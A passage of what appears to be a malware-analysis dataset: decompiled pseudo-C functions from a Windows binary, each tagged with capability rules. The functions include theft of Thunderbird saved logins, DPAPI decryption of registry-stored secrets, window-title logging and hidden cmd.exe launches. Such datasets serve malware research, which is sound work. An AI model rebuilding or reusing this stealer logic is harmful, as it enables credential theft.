= (uVar9 * 0x20 | uVar9 >> 0x1b) + (uVar15 ^ uVar3 ^ uVar22) + 0xca62c1d6 + uVar2 + uVar10;\n    uVar18 = uVar8 ^ uVar11 ^ uVar4 ^ uVar18;\n    uVar3 = uVar18 << 1 | uVar18 < 0;\n    uVar20 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar9 = (uVar14 * 0x20 | uVar14 >> 0x1b) + (uVar15 ^ uVar25 ^ uVar9) + uVar3 + uVar22 + 0xca62c1d6;\n    uVar19 = uVar1 ^ uVar5 ^ uVar16 ^ uVar19;\n    uVar22 = uVar19 << 1 | uVar19 < 0;\n    uVar10 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar14 = (uVar9 * 0x20 | uVar9 >> 0x1b) + (uVar25 ^ uVar20 ^ uVar14) + uVar22 + uVar15 + 0xca62c1d6;\n    uVar4 = uVar2 ^ uVar13 ^ uVar6 ^ uVar4;\n    uVar18 = uVar4 << 1 | uVar4 < 0;\n    uVar23 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar9 = (uVar14 * 0x20 | uVar14 >> 0x1b) + (uVar20 ^ uVar10 ^ uVar9) + uVar18 + uVar25 + 0xca62c1d6;\n    uVar19 = uVar12 ^ uVar17 ^ uVar16 ^ uVar3;\n    uVar19 = uVar19 << 1 | uVar19 < 0;\n    uVar25 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar20 = (uVar9 * 0x20 | uVar9 >> 0x1b) + (uVar14 ^ uVar10 ^ uVar23) + 0xca62c1d6 + uVar19 + uVar20;\n    uVar4 = uVar7 ^ uVar21 ^ uVar6 ^ uVar22;\n    uVar4 = uVar4 << 1 | uVar4 < 0;\n    uVar15 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar14 = (uVar25 ^ uVar9 ^ uVar23) + uVar4 + uVar10 + 0xca62c1d6 + (uVar20 * 0x20 | uVar20 >> 0x1b);\n    uVar9 = uVar8 ^ uVar24 ^ uVar17 ^ uVar18;\n    uVar17 = uVar9 << 1 | uVar9 < 0;\n    uVar16 = uVar20 >> 2 | uVar20 * 0x40000000;\n    uVar10 = uVar23 + 0xca62c1d6 + (uVar25 ^ uVar15 ^ uVar20) + uVar17 + (uVar14 * 0x20 | uVar14 >> 0x1b);\n    uVar9 = uVar1 ^ uVar11 ^ uVar21 ^ uVar19;\n    uVar9 = uVar9 << 1 | uVar9 < 0;\n    uVar20 = (uVar15 ^ uVar16 ^ uVar14) + uVar9 + uVar25 + 0xca62c1d6 + (uVar10 * 0x20 | uVar10 >> 0x1b);\n    uVar21 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar14 = uVar2 ^ uVar5 ^ uVar24 ^ uVar4;\n    uVar6 = uVar14 << 1 | uVar14 < 0;\n    uVar23 = uVar10 >> 2 | uVar10 * 0x40000000;\n    uVar14 = (uVar16 ^ uVar21 ^ uVar10) + uVar6 + uVar15 + (uVar20 * 0x20 | uVar20 >> 0x1b) + 0xca62c1d6;\n    uVar10 = uVar13 ^ uVar11 ^ uVar17 ^ uVar3;\n    uVar11 = uVar12 ^ uVar5 ^ uVar9 ^ uVar22;\n    uVar10 = uVar10 << 1 | uVar10 < 0;\n    uVar5 = uVar11 << 1 | uVar11 < 0;\n    uVar16 = (uVar20 ^ uVar21 ^ uVar23) + uVar10 + uVar16 + 0xca62c1d6 + (uVar14 * 0x20 | uVar14 >> 0x1b);\n    uVar20 = uVar20 >> 2 | uVar20 * 0x40000000;\n    uVar11 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar18 = uVar7 ^ uVar13 ^ uVar6 ^ uVar18;\n    uVar13 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar15 = uVar21 + 0xca62c1d6 + (uVar20 ^ uVar14 ^ uVar23) + uVar5 + (uVar16 * 0x20 | uVar16 >> 0x1b);\n    uVar14 = uVar18 << 1 | uVar18 < 0;\n    uVar19 = uVar8 ^ uVar12 ^ uVar10 ^ uVar19;\n    uVar12 = (uVar20 ^ uVar11 ^ uVar16) + 0xca62c1d6 + uVar14 + uVar23 + (uVar15 * 0x20 | uVar15 >> 0x1b);\n    uVar19 = uVar19 << 1 | uVar19 < 0;\n    uVar16 = uVar15 >> 2 | uVar15 * 0x40000000;\n    uVar18 = (uVar11 ^ uVar13 ^ uVar15) + uVar19 + uVar20 + (uVar12 * 0x20 | uVar12 >> 0x1b) + 0xca62c1d6;\n    uVar4 = uVar1 ^ uVar7 ^ uVar5 ^ uVar4;\n    uVar4 = uVar4 << 1 | uVar4 < 0;\n    uVar7 = (uVar18 * 0x20 | uVar18 >> 0x1b) + (uVar13 ^ uVar16 ^ uVar12) + 0xca62c1d6 + uVar4 + uVar11;\n    uVar12 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar17 = uVar2 ^ uVar8 ^ uVar14 ^ uVar17;\n    uVar3 = uVar1 ^ uVar19 ^ uVar9 ^ uVar3;\n    uVar1 = (uVar12 ^ uVar18 ^ uVar16) + 0xca62c1d6 + uVar13 +\n            (uVar17 << 1 | uVar17 < 0) + (uVar7 * 0x20 | uVar7 >> 0x1b);\n    uVar13 = uVar18 >> 2 | uVar18 * 0x40000000;\n    uVar22 = uVar2 ^ uVar4 ^ uVar6 ^ uVar22;\n    uVar8 = (uVar3 << 1 | uVar3 < 0) + (uVar1 * 0x20 | uVar1 >> 0x1b) + (uVar13 ^ uVar7 ^ uVar12) + 0xca62c1d6 + uVar16;\n    uVar7 = uVar7 >> 2 | uVar7 * 0x40000000;\n    var_5ch[2] = var_5ch[2] + (uVar1 >> 2 | uVar1 * 0x40000000);\n    var_5ch[3] = var_5ch[3] + uVar7;\n    var_5ch[1] = var_5ch[1] + uVar8;\n    var_5ch[4] = var_5ch[4] + uVar13;\n    *var_5ch = (uVar13 ^ uVar7 ^ uVar1) + *var_5ch +\n               (uVar8 * 0x20 | uVar8 >> 0x1b) + 0xca62c1d6 + (uVar22 << 1 | uVar22 < 0) + uVar12;\n    return;\n}\n",
        "token_count": 10798
    },
    "00407806": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "create thread",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407806(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpThreadAttributes;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    lpThreadAttributes = 0;\n    var_8h = fcn.00401085(0x1c);\n    iVar1 = arg_ch + 8;\n    piVar3 = var_8h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    var_8h[3] = *(arg_ch + 4);\n    fcn.00403549(iVar1);\n    var_8h[1] = arg_8h;\n    *var_8h = var_4h;\n    var_8h[6] = *(arg_ch + 4);\n    iVar2 = fcn.00401085(0x208);\n    fcn.0040373f(iVar1);\n    fcn.0040373f(iVar1);\n    iVar1 = fcn.00403373();\n    fcn.0040102c(iVar2, arg_ch, iVar1 * 2 + 2);\n    fcn.00405feb();\n    fcn.00405feb();\n    piVar3 = var_8h;\n    var_8h[5] = iVar2;\n    uVar4 = *(arg_ch + 4);\n    fcn.0041178e();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00407501, piVar3, 0, &lpThreadAttributes);\n    fcn.00401edd(arg_8h_00);\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*(var_4h + 0x10), arg_8h_00, uVar4, piVar3);\n    return;\n}\n",
        "token_count": 505
    },
    "00407a8e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "get common file path"
        ],
        "decompiled_code": "\nuint fcn.00407a8e(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char *arg_10h;\n    uint var_60h;\n    uint var_14h;\n    uint uStack20;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.00410cff();\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0xff, 0x1000, 0x40);\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(iVar1, 0x104);\n    arg_10h = \"\\\\System32\\\\cmd.exe\";\n    iVar3 = iVar1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar1, \"\\\\System32\\\\cmd.exe\", 0x14);\n    fcn.0040102c(iVar2 + iVar1, iVar3, arg_10h);\n    fcn.00401052(&var_60h, 0, 0x44);\n    var_14h = 0;\n    uStack20 = 0;\n    var_ch = 0;\n    uStack12 = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(iVar1, 0, 0, 0, 0, 0x8000000, 0, 0, &var_60h, &var_14h);\n    if (iVar3 == 0) {\n        var_ch = fcn.00410cd8();\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    }\n    return var_ch;\n}\n",
        "token_count": 386
    },
    "004085cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get graphical window text",
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.004085cb(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint lpString;\n    uint var_ch;\n    uint var_8h;\n    uint lpString2;\n    \n    fcn.00401052(&lpString, 0, 0x208);\n    lpString2 = 0;\n    uVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    iVar5 = (*_sym.imp.USER32.dll_GetWindowTextW)(uVar4, &lpString, 0x104);\n    if (iVar5 < 1) {\n        fcn.00403411(0x417a70);\n    }\n    else {\n        uVar4 = fcn.004036f7(&lpString);\n        fcn.0040357c(0x417a68);\n        fcn.00403447(uVar4);\n        fcn.0040357c(0x417a6c);\n        fcn.00405feb();\n        var_8h = 0;\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_lstrlenW;\n    iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*0x42675c + 0x210);\n    if (iVar5 != 0) {\n        uVar4 = fcn.004036f7(*0x42675c + 0x210);\n        iVar6 = fcn.0040335a(uVar4);\n        fcn.00405feb();\n        iVar5 = *0x42675c;\n        var_8h = 0;\n        if (iVar6 != 0) {\n            *(*0x42675c + 0xa10) = 1;\n            goto code_r0x004086ce;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x42675c + 0x210, lpString2);\n    iVar5 = *0x42675c;\n    *(*0x42675c + 0xa10) = 0;\ncode_r0x004086ce:\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(iVar5 + 0xc), 4, 1, 0, 4, 0x80, 0);\n    iVar5 = *0x42675c;\n    pcVar2 = _sym.imp.KERNEL32.dll_WriteFile;\n    piVar1 = *0x42675c + 0xa10;\n    *(*0x42675c + 4) = uVar4;\n    if (*piVar1 == 0) {\n        uVar4 = (*pcVar3)(0x417a60, iVar5 + 8, 0);\n        (*pcVar2)(*(*0x42675c + 4), 0x417a60, uVar4);\n        uVar4 = lpString2;\n        iVar5 = fcn.00403373(*0x42675c + 8, 0);\n        (*pcVar2)(*(*0x42675c + 4), uVar4, iVar5 * 2);\n        uVar4 = (*pcVar3)(0x417a60, *0x42675c + 8, 0);\n        (*pcVar2)(*(*0x42675c + 4), 0x417a60, uVar4);\n        iVar5 = *0x42675c;\n    }\n    iVar5 = (*pcVar3)(var_ch, iVar5 + 8, 0);\n    (*pcVar2)(*(*0x42675c + 4), var_ch, iVar5 * 2);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(*(*0x42675c + 4));\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 854
    },
    "0040961c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040961c(int32_t *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    uVar1 = *param_2;\n    iVar4 = *param_1;\n    iVar5 = 0;\n    iVar3 = fcn.0040319e();\n    pcVar2 = _sym.imp.SHLWAPI.dll_StrStrA;\n    while( true ) {\n        iVar4 = (*pcVar2)(iVar4, uVar1);\n        if (iVar4 == 0) break;\n        iVar5 = iVar5 + 1;\n        iVar4 = iVar3 + 4 + iVar4;\n    }\n    return iVar5;\n}\n",
        "token_count": 189
    },
    "00409655": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409655(uint *arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint in_ECX;\n    int32_t *in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.0040319e();\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrA;\n    iVar3 = *in_EDX;\n    uVar4 = *arg_8h;\n    do {\n        iVar3 = (*pcVar1)(iVar3, uVar4);\n        iVar3 = iVar2 + 3 + iVar3;\n        arg_ch = arg_ch + -1;\n    } while (arg_ch != 0);\n    iVar2 = (*pcVar1)(iVar3, 0x418f14);\n    uVar4 = fcn.00405f68();\n    fcn.00406056(iVar2 - iVar3);\n    fcn.004034d1(uVar4);\n    fcn.00405feb();\n    return in_ECX;\n}\n",
        "token_count": 255
    },
    "00409718": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409718(uint arg_8h)\n\n{\n    fcn.00402fce(&arg_8h);\n    fcn.00403148();\n    return;\n}\n",
        "token_count": 42
    },
    "0040983d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: hKey\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.0040983d(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint32_t uVar4;\n    uint32_t unaff_EDI;\n    uint var_1010h;\n    uint uStackY208;\n    uint uStackY204;\n    uint *puStackY200;\n    uint uStackY196;\n    uint uStackY192;\n    uint *puStackY188;\n    uint uStackY184;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    hKey = 0x40984a;\n    fcn.004011c0();\n    uVar4 = 0;\n    hKey = unaff_EBX;\n    fcn.00401052();\n    fcn.00401052();\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegOpenKeyExW;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)();\n    if ((((iVar3 == 0) || (iVar3 = (*pcVar1)(),  iVar3 == 0)) || (iVar3 = (*pcVar1)(),  iVar3 == 0)) ||\n       (iVar3 = (*pcVar1)(),  iVar3 == 0)) {\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrcpyW;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryInfoKeyW)();\n        if (iVar3 == 0) {\n            if (unaff_EDI != 0) {\n                do {\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyExW)();\n                    if (iVar3 != 0) {\n                        return 0;\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                    (*pcVar2)();\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n                    iVar3 = (*pcVar1)();\n                    if (iVar3 != 0) {\n                        return 0;\n                    }\n                    uStackY184 = 0x4099c3;\n                    fcn.004099ff(hKey);\n                    uStackY184 = hKey;\n                    puStackY188 = 0x4099cc;\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                    puStackY188 = &fcn.0040983d::hKey;\n                    uStackY192 = 0xf003f;\n                    uStackY196 = 0;\n                    puStackY200 = &fcn.0040983d::var_1010h;\n                    uStackY204 = 0x80000001;\n                    uStackY208 = 0x4099e5;\n                    iVar3 = (*pcVar1)();\n                    if (iVar3 != 0) {\n                        return 0;\n                    }\n                    uVar4 = uVar4 + 1;\n                } while (uVar4 < unaff_EDI);\n            }\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 737
    },
    "004099ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004099ff(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar auStackY17204 [8192];\n    uchar auStackY9012 [8192];\n    uint var_330h;\n    uint var_228h;\n    uint var_120h;\n    uint uStackY256;\n    uint *arg_8h_00;\n    uchar *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x409a0c;\n    fcn.004011c0();\n    var_4h = 0x1000;\n    var_10h = NULL;\n    var_14h = NULL;\n    var_ch = 0;\n    fcn.00401052();\n    fcn.00401052();\n    fcn.00401052();\n    fcn.00401052();\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExW;\n    var_10h = &fcn.004099ff::var_4h;\n    var_14h = &stack0xffffdccc;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)();\n    if (iVar2 == 0) {\n        fcn.00403411(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00403411(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00403411(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00403411(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00403411(&stack0xffffdccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00401052();\n        fcn.00409d97(var_4h);\n        fcn.00403411(&stack0xffffbccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00401052();\n        fcn.00409d97(var_4h);\n        fcn.00403411(&stack0xffffbccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00401052();\n        fcn.00409d97(var_4h);\n        fcn.00403411(&stack0xffffbccc);\n    }\n    var_4h = 0x1000;\n    fcn.00401052();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00401052();\n        fcn.00409d97(var_4h);\n        fcn.00403411(&stack0xffffbccc);\n    }\n    var_8h = 3;\n    iVar2 = fcn.00403373();\n    if (0 < iVar2) {\n        arg_8h_00 = &fcn.004099ff::var_14h;\n        uStackY256 = 0x409d7e;\n        fcn.00401ff2(arg_8h_00);\n        uStackY256 = 0x409d85;\n        fcn.00402028(arg_8h_00);\n    }\n    fcn.00401441();\n    return 1;\n}\n",
        "token_count": 1003
    },
    "00409d97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: pDataIn\n\nvoid __cdecl fcn.00409d97(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    int32_t extraout_ECX;\n    uint16_t *puVar2;\n    uint extraout_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    char16_t acStack8216 [4076];\n    uint uStack64;\n    uint uStack60;\n    char16_t *pcStack56;\n    uint *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint pDataOut;\n    int32_t var_10h;\n    int32_t pDataIn;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0x409da4;\n    fcn.004011c0();\n    var_10h = arg_8h + -1;\n    pDataOut = 0x40;\n    puStack28 = 0x409dbb;\n    var_4h = extraout_ECX;\n    var_8h = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n    iVar3 = 1;\n    if (1 < arg_8h) {\n        do {\n            *(var_8h + -1 + iVar3) = *(iVar3 + var_4h);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    pDataIn = arg_8h + -1;\n    iVar4 = 0;\n    puStack28 = &fcn.00409d97::pDataOut;\n    uStack32 = 0;\n    uStack36 = 0;\n    uStack40 = 0;\n    uStack44 = 0;\n    uStack48 = 0;\n    puStack52 = &fcn.00409d97::pDataIn;\n    pcStack56 = 0x409df1;\n    iVar3 = (*_sym.imp.CRYPT32.dll_CryptUnprotectData)();\n    if (iVar3 == 0) {\n        pcStack56 = L\"Could not decrypt\";\n    }\n    else {\n        if (0 < arg_8h) {\n            puVar2 = &stack0xffffdfe8;\n            do {\n                puVar1 = var_10h + iVar4;\n                iVar4 = iVar4 + 2;\n                *puVar2 = *puVar1;\n                puVar2 = puVar2 + 1;\n            } while (iVar4 < arg_8h);\n        }\n        pcStack56 = &stack0xffffdfe8;\n    }\n    uStack64 = 0x409e28;\n    uStack60 = extraout_EDX;\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n    return;\n}\n",
        "token_count": 672
    },
    "00409e2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "check if file exists",
            "read .ini file",
            "copy file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409e2d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uint uVar7;\n    uint uVar8;\n    uint var_4c4h;\n    uint lpApplicationName;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_a0h;\n    uint var_9ch;\n    uint lpBinaryType;\n    int32_t var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpExistingFileName;\n    uint lpNewFileName;\n    uint var_8h;\n    \n    var_1ch = in_ECX;\n    fcn.004036f7(L\"Profile\");\n    uVar4 = 0;\n    fcn.00401052(&var_4c4h, 0, 0x208);\n    var_34h = 0;\n    lpBinaryType = 0;\n    fcn.00401052(&lpApplicationName, 0, 0x104);\n    fcn.0040b87d();\n    fcn.004036f7(&lpApplicationName);\n    (*_sym.imp.KERNEL32.dll_GetBinaryTypeW)(&lpApplicationName, &lpBinaryType);\n    puVar5 = &var_28h;\n    fcn.0040373f(puVar5);\n    iVar1 = fcn.0040ade3(puVar5);\n    if (iVar1 == 0) {\n        puVar5 = &var_28h;\n        fcn.0040373f(puVar5);\n        iVar1 = fcn.0040ade3(puVar5);\n        if (iVar1 == 0) goto code_r0x0040a34f;\n    }\n    fcn.0040357c(L\"\\\\Thunderbird\\\\\");\n    fcn.0040373f(&arg_8h);\n    fcn.0040357c(L\"profiles.ini\");\n    uVar4 = fcn.004036f7(L\"Profile\");\n    fcn.00403549(uVar4);\n    fcn.00405feb();\n    fcn.00403384(0);\n    while (iVar1 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)(var_14h, L\"Path\", 0, &var_4c4h, 0x104, var_20h), \n          iVar1 != 0) {\n        iVar1 = var_34h + 1;\n        var_34h = iVar1;\n        uVar4 = fcn.004036f7(L\"Profile\");\n        fcn.00403549(uVar4);\n        fcn.00405feb();\n        var_38h = 0;\n        fcn.00403384(iVar1);\n        fcn.0040373f(&arg_8h);\n        fcn.0040357c(&var_4c4h);\n        fcn.00403666(&var_18h);\n        iVar1 = (**(in_ECX + 0x68))(var_18h);\n        if (((iVar1 == 0) && (var_94h = (**(in_ECX + 0x80))(),  var_94h != 0)) &&\n           (iVar1 = (**(in_ECX + 0x7c))(var_94h, 1, 0),  iVar1 == 0)) {\n            fcn.0040373f(&var_8h);\n            fcn.0040357c(L\"\\\\logins.json\");\n            fcn.00410c8a();\n            fcn.0040357c(0x4176a4);\n            uVar4 = fcn.004035b9();\n            fcn.00403447(uVar4);\n            fcn.00405feb();\n            var_3ch = 0;\n            fcn.0040357c(L\".tmp\");\n            uVar4 = lpNewFileName;\n            iVar1 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, lpNewFileName, 0);\n            if (iVar1 != 0) {\n                fcn.00403549(&lpNewFileName);\n            }\n            fcn.004113ed();\n            fcn.00403549(&lpExistingFileName);\n            uVar7 = 0xc0000000;\n            uVar8 = extraout_ECX;\n            iVar1 = fcn.004116b1(0xc0000000);\n            if (iVar1 != 0) {\n                var_30h = 0;\n                var_2ch = 0;\n                fcn.0041135c(&var_30h, var_a0h, 0);\n                fcn.004034d1(\"encryptedUsername\");\n                fcn.0040305d(&var_9ch);\n                iVar2 = fcn.0040961c();\n                var_68h = iVar2;\n                fcn.00405feb();\n                fcn.00405feb();\n                iVar1 = var_68h;\n                while (iVar2 != 0) {\n                    pcVar6 = \"hostname\";\n                    var_60h = 0;\n                    var_5ch = 0;\n                    var_58h = 0;\n                    iVar2 = iVar1;\n                    uVar4 = fcn.004034d1(\"hostname\");\n                    puVar5 = &var_6ch;\n                    fcn.0040305d(puVar5);\n                    fcn.00409655(puVar5, uVar4);\n                    fcn.00405feb(pcVar6, iVar2);\n                    fcn.00405feb();\n                    pcVar6 = \"encryptedUsername\";\n                    iVar2 = iVar1;\n                    uVar4 = fcn.004034d1(\"encryptedUsername\");\n                    puVar5 = &var_74h;\n                    fcn.0040305d(puVar5);\n                    fcn.00409655(puVar5, uVar4);\n                    fcn.00405feb(pcVar6, iVar2);\n                    fcn.00405feb();\n                    pcVar6 = \"encryptedPassword\";\n                    iVar2 = iVar1;\n                    uVar4 = fcn.004034d1(\"encryptedPassword\");\n                    puVar5 = &var_7ch;\n                    fcn.0040305d(puVar5);\n                    fcn.00409655(puVar5, uVar4);\n                    fcn.00405feb(pcVar6, iVar2);\n                    fcn.00405feb();\n                    fcn.0040a8c3(var_50h, &var_84h);\n                    fcn.0040a8c3(var_4ch, &var_8ch);\n                    uVar4 = fcn.004031af(&var_40h);\n                    fcn.00403549(uVar4);\n                    fcn.00405feb();\n                    puVar5 = &var_44h;\n                    var_40h = 0;\n                    uVar4 = var_84h;\n                    fcn.004034d1(var_84h);\n                    uVar3 = fcn.004031af(uVar4);\n                    fcn.00403549(uVar3);\n                    fcn.00405feb(uVar3, uVar4, puVar5);\n                    var_44h = 0;\n                    fcn.00405feb();\n                    puVar5 = &var_48h;\n                    uVar4 = var_8ch;\n                    fcn.004034d1(var_8ch);\n                    uVar3 = fcn.004031af(uVar4);\n                    fcn.00403549(uVar3);\n                    fcn.00405feb(uVar3, uVar4, puVar5);\n                    var_48h = 0;\n                    fcn.00405feb();\n                    var_54h = 4;\n                    puVar5 = &var_60h;\n                    fcn.00401ff2(puVar5);\n                    fcn.00402028(puVar5);\n                    fcn.00405feb();\n                    fcn.00405feb();\n                    fcn.00405feb();\n                    fcn.00401441();\n                    iVar1 = iVar1 + -1;\n                    uVar4 = lpNewFileName;\n                    iVar2 = iVar1;\n                }\n                iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(uVar4);\n                if (iVar1 != 0) {\n                    puVar5 = &lpNewFileName;\n                    fcn.0040373f(puVar5);\n                    fcn.0041142a(puVar5);\n                }\n                (**(var_1ch + 0x84))(var_94h);\n                (**(var_1ch + 0x6c))();\n                fcn.00403148();\n            }\n            fcn.0041140c(uVar7, uVar8);\n            fcn.00405feb();\n            lpNewFileName = 0;\n            fcn.00405feb();\n            lpExistingFileName = 0;\n            fcn.00405feb();\n            fcn.00405feb();\n            in_ECX = 